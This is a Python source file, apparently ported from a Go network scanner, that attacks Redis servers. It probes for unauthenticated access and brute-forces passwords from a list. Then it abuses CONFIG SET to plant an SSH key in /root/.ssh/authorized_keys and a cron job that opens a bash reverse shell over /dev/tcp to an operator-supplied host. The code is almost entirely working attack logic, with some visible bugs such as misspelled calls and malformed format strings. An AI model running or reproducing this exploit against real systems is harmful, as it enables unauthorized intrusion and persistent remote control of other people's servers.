import os
import sys
import socket
from common import config
BUFSIZ=65535
dbfilename=""
dir=""


def RedisScan(info):
    try:
        flag=RedisUnauth(info)
        if flag:
            return
        for pwd in config.Passwords:
            pwd.replace("{user}","redis")
            flag=RedisConn(info,pwd)
            if flag:
                return
            else:
                print("[-] redis {}:{} {}", info.Host, info.Ports,pwd)
    except Exception as e:
        pass


def RedisConn(info , pwd ):
    flag = False;
    realhost="{}:{}".format(info.Host,info.Ports)
    try:
        socket.setdefaulttimeout(info.Timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((info.Host, int(info.Ports)))
        s.send(bytes("auth {}\r\n".format(pwd), 'UTF-8'))
        result = s.recv(BUFSIZ).decode()
        if "+OK" in result:
            flag=True
            dbfilename, dir, err = getconfig(s)
            if err != None :
                result = "[+] Redis:{} {}".format(realhost,pwd)
                print(result)
                return flag
            else:
                result="[+] Redis:{} {} file:{}/{}".format(realhost, pwd, dir, dbfilename)
                print(result)
        Expoilt(realhost, s)
        return flag
    except Exception as e:
        return flag
    finally:
        s.close()


def Expoilt(realhost, conn):
    #  go里面 先 flagSsh, flagCron := testwrite(conn) 测试能不能把redis的备份目录改为ssh公钥目录 和 定时任务目录
    #   这里就不测试了
    if config.RedisFile!="":
        writeok = writekey(conn, config.RedisFile)
        if  not writeok:
            print("[-] {} SSH write key errer".format(realhost))
        else:
            print("[ +] %v SSH public key was written successfully".format(realhost))
    if config.RedisShell != "":
        writeok= writecron(conn, config.RedisShell)
        if writeok:
            print("[+] %v /var/spool/cron/root was written successfully".format(realhost))
        else:
            print("[-] Redis:"+realhost +"cron write failed")
    recoverdb(dbfilename, dir, conn)


# 返回flag
def writekey(conn ,filename):
    flag=False
    try:
        conn.send(bytes("CONFIG SET dir /root/.ssh/\r\n", 'UTF-8'))
        result = conn.recv(BUFSIZ).decode()
        if "OK" in result:
            conn.send(bytes("CONFIG SET dbfilename authorized_keys\r\n", 'UTF-8'))
            result = conn.recv(BUFSIZ).decode()
            if  "OK" in result:
                key=Readfile(filename)
                if len(key)==0:
                    print("the keyfile {} is empty".format(filename))
                    return flag
                conn.send(bytes("set x \"\\n\\n\\n{}\\n\\n\\n\"\r\n".format(key), 'UTF-8'))
                result = conn.recv(BUFSIZ).decode()
                if "OK" in result:
                    conn.send(bytes("save\r\n", 'UTF-8'))
                    result = conn.recv(BUFSIZ).decode()
                    if "OK" in result:
                        flag =True
        return flag
    except Exception as e:
        print(e)
        return flag


def writecron(conn,host):
    flag=False
    try:
        conn.send(bytes("CONFIG SET dir /var/spool/cron/\r\n", 'UTF-8'))
        result = conn.recv(BUFSIZ).decode()
        if "OK" in result:
            scanIp=host.Split(":")[0]
            scanPort=host.Split(":")[1]
            conn.send(bytes("set xx \"\\n* * * * * bash -i >& /dev/tcp/{}/{} 0>&1\\n\"\r\n".format( scanIp, scanPort), 'UTF-8'))
            result = conn.recv(BUFSIZ).decode()
            if "OK" in result:
                conn.send(bytes("save\r\n", 'UTF-8'))
                result = conn.recv(BUFSIZ).decode()
                if "OK" in result:
                    flag = True
        return flag
    except Exception as e:
        print(e)
        return flag


def Readfile(filename ):
    try:
        f = open(filename, mode='r')
        for line in f:
            text = line.strip()
            if text!="":
                return  text
    except:
        print("Open %s error\n" % filename)
        sys.exit(1)
    else:
        f.close()
    return ""


def recoverdb(dbfilename,dir,conn):
    conn.send(bytes("CONFIG SET dbfilename {}}\r\n".format(dbfilename), 'UTF-8'))
    conn.send(bytes("CONFIG SET dir {}\r\n".format(dir), 'UTF-8'))
    return


def RedisUnauth(info):
    flag=False
    try:
        socket.setdefaulttimeout(info.Timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((info.Host, int(info.Ports)))
        s.send(bytes("INFO\r\n", 'UTF-8'))
        result = s.recv(BUFSIZ).decode()
        #print(result)
        if "redis_version" in result:
            flag = True
            dbfilename, dir, err = getconfig(s)
            if err!=None:
                result = "[+] Redis:{} unauthorized".format(info.Host + +":" + info.Ports)
                # ToDo common.LogSuccess(result)
                print(result)
            else:
                result="[+] Redis:{} unauthorized file:{}/{}".format( info.Host +":" + info.Ports,dir,dbfilename)
                # ToDo common.LogSuccess(result)
                print(result)
        s.close()
    except Exception as e:
        #print(e)
        pass
    finally:
        return flag


def getconfig(sock):
    dbfilename=""
    dir=""
    err=None
    try:
        sock.send(bytes("CONFIG GET dbfilename\r\n", 'UTF-8'))
        receive = sock.recv(BUFSIZ)
        text=bytes.decode(receive)
        text1=text.split("\r\n");
        if len(text1)>2:
            dbfilename=text1[len(text1)-2]
        else:
            dbfilename = text1[0]
        #print(dbfilename)
        sock.send(bytes("CONFIG GET dir\r\n", 'UTF-8'))
        text = sock.recv(BUFSIZ).decode()
        text1 = text.split("\r\n")
        if len(text1)>2:
            dir=text1[len(text1)-2]
            print(dir)
        else:
            dir = text1[0]
        #print(dir)  这里的dir有时是dump.rdb 有时是 /var/lib/redis不知道为什么
        return dbfilename,dir,err
    except Exception as e:
        return dbfilename,dir,e


if __name__ == "__main__":

    info=config.HostInfo()
    info.Host="172.27.236.199"
    info.Ports="6379"
    RedisUnauth(info)